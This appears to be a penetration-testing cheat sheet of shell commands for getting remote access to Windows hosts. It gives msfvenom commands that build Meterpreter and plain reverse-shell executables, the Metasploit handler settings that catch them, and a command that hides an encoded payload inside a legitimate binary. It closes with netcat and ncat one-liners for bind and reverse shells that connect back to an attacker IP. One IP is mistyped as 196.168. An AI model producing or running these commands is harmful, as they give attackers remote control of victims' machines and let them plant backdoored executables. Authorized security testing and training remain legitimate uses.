## Msfvenom

* Meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
```

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

* Non-staged payload (works with nc)

```
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

* Staged payload (must be caught with metasploit)

```
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```

* Inject payload into binary

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## Netcat Shell

```
nc.exe -nlvp 4444 -e cmd.exe
nc.exe 192.168.1.101 443 -e cmd.exe

ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
ncat -nv <ip_to_connect> 4444
```

